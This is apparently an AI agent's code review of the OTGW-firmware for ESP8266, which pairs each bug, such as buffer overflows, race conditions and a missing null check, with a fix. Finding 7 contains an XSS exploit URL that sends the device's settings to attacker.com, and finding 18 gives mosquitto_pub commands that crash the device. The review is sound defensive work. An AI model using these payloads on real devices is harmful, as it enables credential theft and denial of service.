---
# METADATA
Document Title: OTGW-firmware Comprehensive Codebase Review (Revised - Impactful Findings Only)
Review Date: 2026-02-13 05:19:57 UTC
Branch Reviewed: copilot/sub-pr-432
Commit Reviewed: 79a9247a38713dd210eacbe62110db4b4a3d4e5f
Reviewer: GitHub Copilot Advanced Agent
Document Type: Comprehensive Code Review (Revised)
Scope: Full source code review of all .ino, .h, and .cpp files in src/OTGW-firmware/
Status: COMPLETE
Revision Notes: Streamlined version - removed 20 non-issues, kept 20 impactful findings
---

# OTGW-firmware Codebase Review (Revised)

**Date:** 2026-02-13  
**Scope:** Full source code review of all `.ino`, `.h`, and `.cpp` files in `src/OTGW-firmware/`

---

## Executive Summary

This revised review focuses on the **20 most impactful findings** from the comprehensive codebase review. The OTGW-firmware is a mature ESP8266 firmware for the OpenTherm Gateway with good embedded practices (modular .ino organization, PROGMEM usage). However, critical bugs were uncovered that affect correctness, safety, and reliability.

**Key Impact Areas:**
- **Memory safety:** Out-of-bounds array writes, stack buffer overflows
- **Data integrity:** Incorrect bitmasks corrupting MQTT time data
- **Concurrency:** ISR race conditions in pulse counter
- **Resource leaks:** File descriptors, HTTP clients
- **Reliability:** Blocking operations risking watchdog resets
- **Security:** Reflected XSS, plus documented ADR-based trade-offs

---

## Critical & High Priority Issues (13 findings)

### 1. Out-of-bounds array write when `OTdata.id == 255`
**File:** `OTGW-Core.ino:1657`, `OTGW-Core.h:472`

**Why it's a bug:**
```cpp
msglastupdated[OTdata.id] = now;
```
`OTdata.id` is an 8-bit value (range 0-255) extracted from OpenTherm messages via `(value >> 16) & 0xFF`. The `msglastupdated` array is declared as `time_t msglastupdated[255]` which provides indices 0-254 only. When `OTdata.id == 255`, this writes past the end of the array.

**Real-world impact:**
- **Memory corruption:** Overwrites adjacent heap/stack memory
- **Unpredictable crashes:** Can corrupt other variables, function pointers, or stack data
- **Occurs on valid OpenTherm messages:** Message ID 255 is a valid (though rarely used) OpenTherm message ID
- **Silent corruption:** No error checking, fails silently and randomly

**Fix:**
```cpp
// OTGW-Core.h:472
time_t msglastupdated[256];  // Was: [255]
```

---

### 2. Wrong bitmask corrupts afternoon/evening hours in MQTT
**File:** `OTGW-Core.ino:1297`

**Why it's a bug:**
```cpp
sendMQTTData(_topic, itoa((OTdata.valueHB & 0x0F), _msg, 10));  // BUG: 0x0F should be 0x1F
```
The OpenTherm protocol specification uses bits 0-4 (5 bits) to encode hours (0-23). A 4-bit mask `0x0F` can only represent values 0-15, truncating hours 16-23 incorrectly:
- Hour 16 (10000b) becomes 0
- Hour 20 (10100b) becomes 4  
- Hour 23 (10111b) becomes 7

The logging code 3 lines above correctly uses `0x1F`.

**Real-world impact:**
- **Incorrect time data in MQTT/Home Assistant:** Afternoon and evening schedules show wrong hours
- **Automation failures:** Time-based automations trigger at wrong times
- **Data integrity:** Historical logs contain corrupted timestamps
- **Affects messages 21, 22, 100, 101:** Day/time messages for CH/DHW schedules

**Fix:**
```cpp
sendMQTTData(_topic, itoa((OTdata.valueHB & 0x1F), _msg, 10));  // 5 bits for hours 0-23
```

---

### 3. `is_value_valid()` references global instead of parameter
**File:** `OTGW-Core.ino:622-624`

**Why it's a bug:**
```cpp
bool is_value_valid(OpenthermData_t OT, OTlookup_t OTlookup) {
  _valid = _valid || (OTlookup.msgcmd==OT_WRITE && OTdata.type==OT_WRITE_DATA);   // BUG: OTdata not OT
  _valid = _valid || (OTlookup.msgcmd==OT_RW && (OT.type==OT_READ_ACK || OTdata.type==OT_WRITE_DATA));
  _valid = _valid || (OTdata.id==OT_Statusflags) || (OTdata.id==OT_StatusVH) || ...;
```
The function signature declares a parameter `OT` to validate, but lines 622-624 reference the global `OTdata` instead. This defeats the purpose of passing `OT` as a parameter and makes the function behavior dependent on global state.

**Real-world impact:**
- **Currently masked:** Function is always called with `OTdata` so bug is hidden
- **Future refactoring risk:** Will break if ever called with a different OpenTherm message
- **Code maintainability:** Violates function contract, confusing for developers
- **Testing difficulty:** Cannot unit test with mock data

**Fix:**
```cpp
bool is_value_valid(OpenthermData_t OT, OTlookup_t OTlookup) {
  _valid = _valid || (OTlookup.msgcmd==OT_WRITE && OT.type==OT_WRITE_DATA);
  _valid = _valid || (OTlookup.msgcmd==OT_RW && (OT.type==OT_READ_ACK || OT.type==OT_WRITE_DATA));
  _valid = _valid || (OT.id==OT_Statusflags) || (OT.id==OT_StatusVH) || ...;
  // ... continue replacing OTdata with OT throughout
```

---

### 4. `sizeof()` vs `strlen()` off-by-one in PIC version parsing
**File:** `OTGW-Core.ino:167`

**Why it's a bug:**
```cpp
const char OTGW_BANNER[] = "OpenTherm Gateway";  // 17 chars + \0 = 18 bytes
// ...
p += sizeof(OTGW_BANNER);   // Returns 18, skips one character too many
```
`sizeof()` on a string literal includes the null terminator. The code needs to skip past the banner text itself (17 chars) but instead skips 18 bytes, dropping the first character of the version string.

**Real-world impact:**
- **Incorrect version display:** First character of PIC firmware version is always missing
- **Version comparisons may fail:** Affects update checks if version string parsing is used
- **User confusion:** Device info shows truncated version (e.g., ".2.9" instead of "4.2.9")

**Fix:**
```cpp
p += sizeof(OTGW_BANNER) - 1;  // Skip banner text only, not null terminator
// OR
p += strlen(OTGW_BANNER);      // More explicit intent
```

---

### 5. Stack buffer overflow in hex file parser
**File:** `versionStuff.ino:43-55`

**Why it's a bug:**
```cpp
char datamem[256];  // Buffer size 256 (indices 0-255)
// ...
if (addr >= 0x4200 && addr <= 0x4300) {
  addr = (addr - 0x4200) >> 1;   // Converts to range 0-128
  while (len > 0) {
    datamem[addr++] = byteswap(data);  // addr can reach 255+ and overflow
    data >>= 8;
    len--;
  }
```
The address calculation produces starting indices 0-128, but the `while` loop increments `addr` up to `len` times (Intel hex records can have `len` up to 255). Starting at index 128 with a long record causes writes beyond `datamem[255]`, overflowing into adjacent stack memory.

**Real-world impact:**
- **Stack corruption:** Overwrites local variables, return addresses, or function call data
- **Crashes and reboots:** Can cause watchdog resets or Exception errors
- **Firmware upgrade failures:** PIC firmware upgrade via Web UI may fail unpredictably
- **Exploitability:** Could potentially be crafted to exploit if malicious hex file is uploaded

**Fix:**
```cpp
while (len > 0) {
  if (addr >= sizeof(datamem)) break;  // Bounds check
  datamem[addr++] = byteswap(data);
  data >>= 8;
  len--;
}
```

---

### 6. ISR race conditions in S0 pulse counter
**File:** `s0PulseCount.ino:32-44, 63-70`

**Why it's a bug:**
Three concurrency issues in interrupt service routine (ISR) handling:

1. **Non-volatile shared variable:**
```cpp
int settingS0COUNTERdebouncetime = 80;  // BUG: Not volatile, read in ISR
```
Read inside ISR (line 35) but not declared `volatile`, violating C/C++ memory model.

2. **TOCTOU race:**
```cpp
if (pulseCount != 0) {           // Check (Time Of Check)
  noInterrupts();
  uint8_t count = pulseCount;    // Use (Time Of Use)
  pulseCount = 0;
  interrupts();
```
Interrupt can fire between the check and the critical section, making the check unreliable.

3. **Read outside critical section:**
```cpp
noInterrupts();
uint8_t count = pulseCount;
pulseCount = 0;
interrupts();
float duration = last_pulse_duration;  // BUG: Read after enabling interrupts
```

4. **Counter overflow:**
`pulseCount` is `uint8_t` (max 255), wraps silently at moderate power levels (e.g., 4kW load = 267 pulses/min with 1000 imp/kWh meter).

**Real-world impact:**
- **Incorrect energy readings:** Race conditions cause missed or double-counted pulses
- **Data loss:** Counter wraparound at 255 pulses loses data
- **MQTT/HA integration broken:** Home Assistant energy dashboard shows wrong consumption
- **Intermittent failures:** Timing-dependent, hard to debug

**Fix:**
```cpp
// Make debounce time volatile
volatile int settingS0COUNTERdebouncetime = 80;

// Expand counter to 16-bit
volatile uint16_t pulseCount = 0;  // Was: uint8_t

// Read all shared variables inside critical section
if (pulseCount != 0) {
  noInterrupts();
  uint16_t count = pulseCount;
  float duration = last_pulse_duration;  // Move inside
  pulseCount = 0;
  interrupts();
  
  // Use count and duration here...
}
```

---

### 7. Reflected XSS in `sendApiNotFound()`
**File:** `restAPI.ino:876`

**Why it's a bug:**
```cpp
void sendApiNotFound() {
  String URI = httpServer.uri();  // User-controlled input from URL
  httpServer.setContentLength(CONTENT_LENGTH_UNKNOWN);
  httpServer.send(200, F("text/html"), F(""));
  httpServer.sendContent(F("<h1>404 - API endpoint '"));
  httpServer.sendContent(URI);  // BUG: Unsanitized user input in HTML response
  httpServer.sendContent(F("' not found</h1>\r\n"));
  httpServer.sendContent(F(""));
}
```
The URI from the HTTP request is directly injected into an HTML response without any escaping or sanitization. This creates a reflected Cross-Site Scripting (XSS) vulnerability.

**Real-world impact:**
- **Script injection:** Attacker crafts URL like `/api/<script>alert(document.cookie)</script>`
- **Session hijacking:** Steal session tokens if ever implemented
- **Phishing:** Display fake login forms on the device's domain
- **Credential theft:** Capture MQTT credentials via JavaScript
- **Local network attacks:** Via CSRF from any website user visits while on same network

**Exploit example:**
```
http://otgw.local/api/<script>fetch('/api/v1/settings').then(r=>r.text()).then(d=>navigator.sendBeacon('http://attacker.com',d))</script>
```

**Fix:**
```cpp
// Option 1: Don't reflect user input
httpServer.send(404, F("text/html"), F("<h1>404 - API endpoint not found</h1>"));

// Option 2: HTML-escape the URI
String escapedURI = htmlEscape(URI);  // Implement HTML entity encoding
httpServer.sendContent(escapedURI);
```

---

### 8. `evalOutputs()` gated by debug flag -- GPIO outputs never run normally
**File:** `outputs_ext.ino:85-86`

**Why it's a bug:**
```cpp
void evalOutputs() {
  if (!settingMyDEBUG) return;  // BUG: Function exits in normal operation
  settingMyDEBUG = false;       // Clears flag immediately
  // ... actual GPIO output logic that never executes ...
}
```
The function that drives GPIO outputs based on boiler status is guarded by a debug flag. It only runs when `settingMyDEBUG == true`, then immediately clears the flag. In normal production use, the GPIO outputs are never evaluated or updated.

**Real-world impact:**
- **GPIO outputs completely broken:** Advertised feature (drive LEDs/relays based on boiler status) doesn't work
- **User expectations violated:** Settings UI allows configuring output pins but they never activate
- **Silent failure:** No error message, users think they misconfigured something
- **Wasted development effort:** Feature exists in code but is effectively disabled

**Fix:**
```cpp
void evalOutputs() {
  // Remove debug gate entirely - this should run on every call
  // OR restructure to: if (settingMyDEBUG) { /* debug logging */ }
  
  // Actual GPIO output logic
  for (uint8_t i = 0; i < OUTPUT_MAXOUTPUTS; i++) {
    // ... evaluate and set GPIO state ...
  }
}
```

---

### 16. `ETX` constant has wrong value
**File:** `OTGW-firmware.h:74`

**Why it's a bug:**
```cpp
#define ETX ((uint8_t)0x04)  // BUG: ASCII ETX is 0x03, this is EOT (End of Transmission)
```
ASCII control codes: ETX (End of Text) = 0x03, EOT (End of Transmission) = 0x04. The code defines `ETX` with the wrong value. If used for protocol detection or framing, this matches the wrong byte.

**Real-world impact:**
- **Protocol errors:** If used in serial communication, detects wrong termination byte
- **Interop failures:** Other systems expecting proper ETX won't recognize 0x04
- **Data corruption:** May capture extra byte or lose last byte of transmission
- **Misleading debugging:** Developers see `ETX` constant but behavior matches EOT

**Fix:**
```cpp
#define ETX ((uint8_t)0x03)  // Correct ASCII ETX value
```

---

### 18. Null pointer dereference in MQTT callback
**File:** `MQTTstuff.ino:312-317`

**Why it's a bug:**
```cpp
void on_message(char* topic, byte* payload, unsigned int length) {
  // ...
  char *lastcmqtt = strtok(buff, "/");    // Can return NULL
  char *midcmqtt = lastcmqtt;
  while ((lastcmqtt = strtok(NULL, "/"))) {  // Can return NULL
    midcmqtt = lastcmqtt;
  }
  
  if (!strcasecmp(lastcmqtt, "set")) {    // Line 312: BUG - lastcmqtt can be NULL
    // ...
    if (!strcasecmp(lastcmqtt, "command")) {  // Line 315: BUG - NULL again
```
`strtok()` returns `NULL` when no more tokens are found. The code doesn't check for `NULL` before passing `lastcmqtt` to `strcasecmp()`, which dereferences the pointer.

**Real-world impact:**
- **Crashes on malformed MQTT topics:** Topics like `""` or `"set"` (no slashes) cause NULL dereference
- **Device reboots:** ESP8266 Exception (9) - LoadStoreAlignmentCause
- **DoS vulnerability:** Attacker on MQTT broker can remotely crash device repeatedly
- **Lost availability:** Home Assistant shows device offline after crash

**Exploit:**
```bash
mosquitto_pub -t "" -m "test"           # Empty topic
mosquitto_pub -t "set" -m "test"        # Single token
mosquitto_pub -t "otgw-firmware/" -m "" # Trailing slash, empty token
```

**Fix:**
```cpp
char *lastcmqtt = strtok(buff, "/");
char *midcmqtt = lastcmqtt;
while ((lastcmqtt = strtok(NULL, "/"))) {
  midcmqtt = lastcmqtt;
}

// Add NULL checks
if (lastcmqtt && !strcasecmp(lastcmqtt, "set")) {
  // ...
  if (lastcmqtt && !strcasecmp(lastcmqtt, "command")) {
    // ...
```

---

### 20. File descriptor leak in `readSettings()`
**File:** `settingStuff.ino:88-97`

**Why it's a bug:**
```cpp
bool readSettings(bool show) {
  File file = LittleFS.open(SETTINGS_FILE, "r");  // Opens file unconditionally
  
  if (!LittleFS.exists(SETTINGS_FILE)) {
    // ...
    return readSettings(false);  // BUG: Recursive call without closing 'file'
  }
  
  // ... normal path closes file ...
}
```
The function opens the file, then checks if it exists. On the non-existent path, it makes a recursive call without closing the file descriptor first. Each recursion leaks a file handle.

**Real-world impact:**
- **Resource exhaustion:** LittleFS has limited file handles (typically 5-10)
- **Subsequent file operations fail:** Unable to open other files after leak
- **Settings corruption:** Cannot write settings after handles exhausted
- **Requires reboot to recover:** Leaked handles persist until device restart
- **Currently low risk:** Only triggers if file is deleted while device running

**Fix:**
```cpp
bool readSettings(bool show) {
  if (!LittleFS.exists(SETTINGS_FILE)) {
    // ... create default settings ...
    return readSettings(false);
  }
  
  File file = LittleFS.open(SETTINGS_FILE, "r");  // Open only after existence check
  // ... rest of function ...
}
```

---

### 21. Year truncated to `int8_t` in `yearChanged()`
**File:** `helperStuff.ino:413`

**Why it's a bug:**
```cpp
bool yearChanged() {
  static int8_t lastyear = 0;    // BUG: 8-bit signed, range -128 to 127
  int8_t thisyear = myTime.year();  // 2026 truncated/wrapped
  
  if (thisyear != lastyear) {
    lastyear = thisyear;
    return true;
  }
  return false;
}
```
Years are stored in `int8_t` with range -128 to 127. Year 2026 = 0x7EA wraps to unpredictable values. The comparison `thisyear != lastyear` still detects changes by accident, but the stored values are meaningless.

**Real-world impact:**
- **Logic works by accident:** Currently still detects year changes due to value changing
- **Fragile code:** Will break if year comparison logic changes
- **Debugging confusion:** Inspecting `lastyear` shows garbage values
- **Overflow risk:** Behavior undefined per C standard (signed overflow)
- **Future-proofing:** Demonstrates lack of attention to data type ranges

**Fix:**
```cpp
bool yearChanged() {
  static int16_t lastyear = 0;    // 16-bit signed, range -32768 to 32767
  int16_t thisyear = myTime.year();
  
  if (thisyear != lastyear) {
    lastyear = thisyear;
    return true;
  }
  return false;
}
```

---

### 22. `requestTemperatures()` blocks for ~750ms
**File:** `sensors_ext.ino:122`

**Why it's a bug:**
```cpp
void readDallasTemp() {
  dallasSensors.requestTemperatures();  // BUG: Blocking call, waits for conversion
  delay(1000);  // Additional blocking delay
```
The DS18B20 temperature sensor conversion time at 12-bit resolution is 750ms. `requestTemperatures()` blocks the entire main loop during this conversion. Combined with the 1000ms delay, the function blocks for 1.75 seconds.

**Real-world impact:**
- **Watchdog reset risk:** ESP8266 watchdog triggers if main loop blocked >3s
- **Unresponsive Web UI:** HTTP requests delayed during sensor reading
- **Missed OpenTherm messages:** Serial buffer can overflow
- **MQTT publish delays:** Time-sensitive messages delayed
- **Poor user experience:** Device appears frozen intermittently

**Fix - Non-blocking pattern:**
```cpp
void readDallasTemp() {
  static unsigned long lastRequest = 0;
  static bool waitingForConversion = false;
  
  if (!waitingForConversion) {
    dallasSensors.requestTemperatures();  // Start conversion (non-blocking)
    lastRequest = millis();
    waitingForConversion = true;
    return;
  }
  
  if (millis() - lastRequest >= 1000) {  // Wait 1 second for conversion
    // Read temperatures (fast)
    for (uint8_t i = 0; i < dallasSensors.getDeviceCount(); i++) {
      float tempC = dallasSensors.getTempCByIndex(i);
      // ... publish to MQTT ...
    }
    waitingForConversion = false;
  }
}
```

---

## Medium Priority Issues (7 findings)

### 23. Settings are written to flash on every individual field update
**File:** `settingStuff.ino:351`

**Why it's a bug:**
```cpp
void updateSetting(const char *field, const char *newValue) {
  // ... update single field in memory ...
  writeSettings();  // BUG: Writes entire config to flash for every field
}
```
Each call to `updateSetting()` triggers a full flash write. When the Web UI saves settings, it calls `updateSetting()` once per field, causing 15-20 flash writes in rapid succession.

**Real-world impact:**
- **Flash wear:** ESP8266 flash has ~10,000 write cycles; excessive writes shorten device lifespan
- **Performance degradation:** Flash writes block for 10-100ms each
- **Unnecessary MQTT reconnections:** Changing MQTT settings triggers reconnect on every field
- **Poor user experience:** Settings save takes several seconds

**Fix:**
```cpp
// Add batching API
void beginSettingsUpdate() { settingsUpdatePending = true; }
void endSettingsUpdate() { 
  if (settingsUpdatePending) {
    writeSettings();
    settingsUpdatePending = false;
  }
}

// Use in REST API handler
beginSettingsUpdate();
while (hasMoreFields) {
  updateSetting(field, value);  // No flash write
}
endSettingsUpdate();  // Single flash write
```

---

### 24. `http.end()` called on uninitialized HTTPClient
**File:** `OTGW-Core.ino:2406`

**Why it's a bug:**
```cpp
void PICfirmwareUpdateCheck() {
  HTTPClient http;
  String latest = checkVersion();
  String version = getPICfwversion();
  
  if (latest == version) {
    DebugTln(F("PIC firmware is up to date"));
    // Falls through to cleanup without calling http.begin()
  } else {
    http.begin(url);  // Only called in else branch
    // ... download firmware ...
  }
  
  http.end();  // BUG: Called unconditionally, even if http.begin() never ran
}
```

**Real-world impact:**
- **Undefined behavior:** Calling `end()` on uninitialized HTTPClient
- **Potential crashes:** May dereference null pointers or invalid state
- **Resource leaks:** If `begin()` allocates resources, `end()` may not handle uninitialized state
- **Currently low severity:** May be safe in current HTTPClient implementation, but fragile

**Fix:**
```cpp
if (latest == version) {
  DebugTln(F("PIC firmware is up to date"));
  return;  // Early return, skip http.end()
}

http.begin(url);
// ... download ...
http.end();
```

---

### 26. `settingMQTTbrokerPort` missing default fallback
**File:** `settingStuff.ino:116`

**Why it's a bug:**
```cpp
// Most settings use the | default pattern:
settingHostname = jsonDoc["Hostname"] | _HOSTNAME;
settingMQTTbroker = jsonDoc["MQTTbroker"] | ""; 

// But MQTT port is missing the default:
settingMQTTbrokerPort = jsonDoc["MQTTbrokerPort"];  // BUG: No | 1883 fallback
```
If the `MQTTbrokerPort` key is missing from the settings JSON (corrupted file, old version, etc.), ArduinoJson returns 0 instead of 1883.

**Real-world impact:**
- **MQTT connection fails:** Port 0 is invalid, connection always fails
- **Silent failure on migration:** Upgrading from version without port setting breaks MQTT
- **Difficult to diagnose:** No error message, looks like broker is down
- **Settings reset required:** User must manually set port to recover

**Fix:**
```cpp
settingMQTTbrokerPort = jsonDoc["MQTTbrokerPort"] | 1883;
```

---

### 27. No GPIO conflict detection
**Files:** `outputs_ext.ino`, `sensors_ext.ino`, `s0PulseCount.ino`

**Why it's a bug:**
Three independent settings configure GPIO pins:
- `settingSENSORSpin` - OneWire temperature sensors
- `settingS0COUNTERpin` - S0 pulse counter (with interrupt)
- `settingGPIOOUTPUTSpin[i]` - Output control pins

No validation prevents users from setting all three to the same GPIO pin (e.g., GPIO4).

**Real-world impact:**
- **Hardware conflicts:** Interrupt handler conflicts with output writes
- **Incorrect readings:** S0 pulses misdetected when output toggles the same pin
- **Unpredictable behavior:** OneWire bus corruption from simultaneous use
- **User confusion:** No error message, device just behaves erratically
- **Difficult debugging:** Users don't realize they configured same pin twice

**Fix:**
```cpp
bool validateGPIOconfig() {
  uint8_t pinUsage[16] = {0};  // Track usage count per pin
  
  if (settingSENSORSenabled && settingSENSORSpin < 16) {
    pinUsage[settingSENSORSpin]++;
  }
  
  if (settingS0COUNTERenabled && settingS0COUNTERpin < 16) {
    pinUsage[settingS0COUNTERpin]++;
  }
  
  for (uint8_t i = 0; i < OUTPUT_MAXOUTPUTS; i++) {
    if (settingGPIOOUTPUTS[i].enabled && settingGPIOOUTPUTS[i].pin < 16) {
      pinUsage[settingGPIOOUTPUTS[i].pin]++;
    }
  }
  
  // Check for conflicts
  for (uint8_t i = 0; i < 16; i++) {
    if (pinUsage[i] > 1) {
      DebugTf(PSTR("GPIO conflict: pin %d used %d times\r\n"), i, pinUsage[i]);
      return false;
    }
  }
  return true;
}

// Call during settings save and on boot
```

---

### 28. `byteswap` macro has no parentheses around parameter
**File:** `versionStuff.ino:6`

**Why it's a bug:**
```cpp
#define byteswap(val) ((val << 8) | (val >> 8))  // BUG: val not parenthesized
```
The macro parameter `val` is used in shift operations without parentheses. If called with an expression, operator precedence causes incorrect results.

**Real-world impact:**
- **Incorrect calculations:** `byteswap(a + b)` expands to `((a + b << 8) | (a + b >> 8))`
- **Due to precedence:** Shifts bind tighter than `+`, becomes `(a + (b << 8)) | (a + (b >> 8))`
- **Silent corruption:** No compiler warning, produces wrong values
- **Currently safe:** All current uses pass simple variables, but fragile

**Example:**
```cpp
uint16_t result = byteswap(data + offset);
// Expands to: ((data + offset << 8) | (data + offset >> 8))
// Actually does: ((data + (offset << 8)) | (data + (offset >> 8)))  WRONG!
```

**Fix:**
```cpp
#define byteswap(val) (((val) << 8) | ((val) >> 8))  // Parenthesize all uses of val
```

---

### 29. Dallas temperature -127C not filtered
**File:** `sensors_ext.ino:132`

**Why it's a bug:**
```cpp
float tempC = dallasSensors.getTempCByIndex(i);
// No validation - publishes directly to MQTT
sprintf_P(payload, PSTR("%.2f"), tempC);  // BUG: -127.00 published when sensor disconnected
sendMQTTData(topic, payload);
```
The DallasTemperature library returns `DEVICE_DISCONNECTED_C` (-127.0°C) when a sensor is disconnected or fails to respond. This is published to MQTT without validation.

**Real-world impact:**
- **Home Assistant false alarms:** -127°C triggers low temperature alerts
- **Broken automations:** Climate control reacts to invalid reading
- **Confusing graphs:** Historical data shows impossible temperature spikes
- **User complaints:** Looks like serious sensor failure

**Fix:**
```cpp
float tempC = dallasSensors.getTempCByIndex(i);

if (tempC <= DEVICE_DISCONNECTED_C) {
  DebugTf(PSTR("Sensor %d disconnected\r\n"), i);
  continue;  // Skip publishing
  // OR publish null/empty to indicate unavailable
}

sprintf_P(payload, PSTR("%.2f"), tempC);
sendMQTTData(topic, payload);
```

---

### 39. Admin password not persisted
**File:** `settingStuff.ino:237`

**Why it's a bug:**
The settings structure and `updateSetting()` function handle `AdminPassword`, but:
- It's never written to the JSON settings file in `writeSettings()`
- It's never read from the JSON file in `readSettings()`
- Password resets to empty string on every device reboot

**Real-world impact:**
- **Feature doesn't work:** Users set admin password via Web UI, but it's lost on reboot
- **Security expectation violated:** Users think they've secured the device, but protection is temporary
- **Confusion and support burden:** Users report password "not working" after restart
- **Misleading UI:** Settings page shows password field but doesn't persist it

**Fix:**
```cpp
// In writeSettings() - add AdminPassword to JSON output:
jsonDoc["AdminPassword"] = settingAdminPassword;

// In readSettings() - read AdminPassword from JSON:
strlcpy(settingAdminPassword, jsonDoc["AdminPassword"] | "", sizeof(settingAdminPassword));
```

**Note:** Consider security implications of storing passwords in cleartext in settings file. May want to hash or encrypt, or document as a limitation.

---

### 40. `postSettings()` uses manual string parsing instead of ArduinoJson
**File:** `restAPI.ino:811-863`

**Why it's a bug:**
```cpp
String wOut = httpServer.arg(0);
wOut.replace("{", "");
wOut.replace("}", "");
wOut.replace("\"", "");
int8_t wp = 0;
// Manual parsing by finding commas and colons
```
The function attempts to parse JSON by stripping characters and splitting on delimiters. This is fragile and incomplete compared to using the ArduinoJson library that's already linked.

**Real-world impact:**
- **Breaks on valid JSON:** Values containing `,`, `:`, `{`, `}`, or `"` parse incorrectly
- **Security risk:** No proper escaping/unescaping, potential injection issues
- **Maintenance burden:** Reimplements JSON parsing badly
- **Inconsistency:** Rest of codebase uses ArduinoJson for serialization/deserialization
- **Example failure:** Setting hostname to `"my,device"` or MQTT broker to `"broker:1883"` breaks

**Broken examples:**
```json
{"Hostname": "device,backup"}     // Parsed as two fields
{"MQTTbroker": "broker:port"}     // Split at colon
{"Field": "value with \"quotes\""} // Quotes already stripped, corrupted
```

**Fix:**
```cpp
void postSettings() {
  String body = httpServer.arg(0);
  
  StaticJsonDocument<1024> jsonDoc;
  DeserializationError error = deserializeJson(jsonDoc, body);
  
  if (error) {
    httpServer.send(400, F("text/plain"), F("Invalid JSON"));
    return;
  }
  
  JsonObject root = jsonDoc.as<JsonObject>();
  for (JsonPair kv : root) {
    updateSetting(kv.key().c_str(), kv.value().as<const char*>());
  }
  
  httpServer.send(200, F("application/json"), F("{\"status\":\"OK\"}"));
}
```

---

## Security Issues (ADR-Documented Trade-offs)

The following items are **not implementation bugs** but documented architectural decisions per ADR-032 and ADR-003. They represent deliberate trade-offs that prioritize ease of use, memory efficiency, and local-network trust over application-level security.

### 9. No authentication on endpoints (documented trade-off per ADR-032)
**Files:** All network-facing modules  
**ADR:** [ADR-032: No Authentication Pattern (Local Network Security Model)](../adr/ADR-032-no-authentication-local-network-security.md)

Per **ADR-032 (Accepted)**, the OTGW-firmware intentionally does not implement authentication on REST API, MQTT command, WebSocket, or Telnet endpoints. This is a deliberate architectural decision based on:
- **Target deployment:** Home local network (not internet-facing)
- **Memory constraints:** ESP8266 has only ~20-25KB available RAM
- **User experience:** Zero-configuration integration with Home Assistant
- **Security model:** Network isolation provides stronger security than application authentication

**Risk within this model:** Any device with network access to the OTGW can change settings, send OpenTherm commands, flash firmware, upload/delete files, and read configuration including MQTT credentials.

**Mitigations (per ADR-032):**
- Keep device on trusted local network only (WPA2/WPA3-encrypted WiFi)
- Use network segmentation (VLAN) to isolate IoT devices
- Access remotely via VPN or secure tunnel (external to device)
- Use reverse proxy with authentication if exposing to untrusted clients
- Physical security (device inside home)

---

### 10. MQTT credentials exposed via Telnet (documented consequence of ADR-032)
**File:** `settingStuff.ino:182`  
**ADR:** [ADR-032: No Authentication Pattern](../adr/ADR-032-no-authentication-local-network-security.md)

`readSettings(true)` prints the MQTT password in cleartext to the unauthenticated Telnet debug stream (invoked via debug commands `q` and `k`). This is a documented consequence of ADR-032's no-authentication model.

**Mitigations (per ADR-032):**
- Telnet server only accessible on trusted local network
- Use firewall rules to restrict Telnet access if needed
- MQTT credentials should not grant access to critical systems
- Consider disabling Telnet in production deployments

---

### 11. File deletion/upload without authentication (documented trade-off per ADR-032)
**File:** `FSexplorer.ino:441-491`  
**ADR:** [ADR-032: No Authentication Pattern](../adr/ADR-032-no-authentication-local-network-security.md)

Per **ADR-032 (Accepted)**, FSexplorer intentionally performs file operations (including `?delete=/settings.ini` and arbitrary uploads) without HTTP-level authentication.

**Mitigations within the current architecture:**
- Keep the device on a trusted LAN only
- Restrict access via firewall/VPN or a reverse proxy with authentication
- Network segmentation to isolate IoT devices

---

### 12. PIC firmware downloaded over plain HTTP (risk under ADR-003 HTTP-only)
**File:** `OTGW-Core.ino:2355`  
**ADR:** [ADR-003: HTTP-Only Network Architecture (No HTTPS)](../adr/ADR-003-http-only-no-https.md)

Consistent with **ADR-003 (Accepted - HTTP-only, no HTTPS/TLS)**, firmware for the PIC microcontroller is fetched from `http://otgw.tclcode.com/` without TLS. This is an accepted architectural constraint based on ESP8266 memory limitations (TLS requires 20-30KB RAM).

**Recommended mitigations within the ADR-003 model:**
- Perform downloads only from trusted networks
- Optionally proxy or mirror the firmware via a trusted internal server
- If feasible, validate firmware integrity via checksums or signatures
- Use VPN when triggering PIC firmware updates from untrusted networks

---

### 13. Wildcard CORS (`Access-Control-Allow-Origin: *`) combined with no-auth (ADR-032)
**File:** `restAPI.ino:267`  
**ADR:** [ADR-032: No Authentication Pattern](../adr/ADR-032-no-authentication-local-network-security.md)

The REST API currently sends `Access-Control-Allow-Origin: *`. Together with **ADR-032's no-auth-by-design** model, this means that any website the user visits can make cross-origin requests to the device from the user's browser.

**Mitigations while keeping ADR-032:**
- Ensure the device is only reachable on trusted LAN segments
- Use firewall rules to restrict access to the device
- Access device Web UI via VPN when on untrusted networks

---

### 14. OTA firmware update with no authentication by default (per ADR-032)
**File:** `OTGW-ModUpdateServer-impl.h:89-93`  
**ADR:** [ADR-032: No Authentication Pattern](../adr/ADR-032-no-authentication-local-network-security.md)

When the OTA username/password are left empty (the default), OTA firmware flashing is intentionally unauthenticated in line with **ADR-032 (Accepted)**.

**Guidance for users:**
- **Configure OTA credentials** when operating in environments where untrusted clients may reach the device
- OTA credentials can be set via the Web UI Settings page
- This provides optional authentication for users who need it while keeping default setup simple

---

## Recommendations (Prioritized)

1. **Fix critical memory safety bugs (#1, #5)** - Out-of-bounds writes and buffer overflows can corrupt memory and crash the device
2. **Fix data integrity bugs (#2, #3, #4)** - Incorrect bitmasks, wrong parameters, and version parsing affect core functionality
3. **Fix ISR race conditions (#6)** - S0 pulse counter has multiple concurrency bugs causing incorrect energy readings
4. **Fix resource leaks (#20, #24)** - File descriptors and HTTP client state not properly cleaned up
5. **Fix security vulnerabilities (#7)** - Reflected XSS allows script injection
6. **Fix disabled features (#8)** - GPIO outputs never run due to debug gate
7. **Fix runtime reliability (#18, #21, #22)** - Null pointer dereference, type truncation, and blocking operations
8. **Address medium priority issues (#23-29, #39-40)** - Flash wear, missing defaults, input validation, API consistency
9. **Review ADR-documented trade-offs (#9-14)** - Decide if security model is acceptable for your deployment

---

## ADR References

This review references the following Architecture Decision Records:

- **[ADR-003: HTTP-Only Network Architecture (No HTTPS)](../adr/ADR-003-http-only-no-https.md)** - Documents the decision to use HTTP-only protocols without TLS/SSL due to ESP8266 memory constraints
- **[ADR-032: No Authentication Pattern (Local Network Security Model)](../adr/ADR-032-no-authentication-local-network-security.md)** - Documents the decision to not implement authentication, relying on network-level security instead

When evaluating security findings in this review, these ADRs represent accepted architectural trade-offs, not implementation oversights. Any changes that would contradict these ADRs should be accompanied by a superseding ADR that revisits the original decision.

---

## Summary Statistics

- **Critical & High Priority Bugs:** 13 findings
- **Medium Priority Issues:** 7 findings  
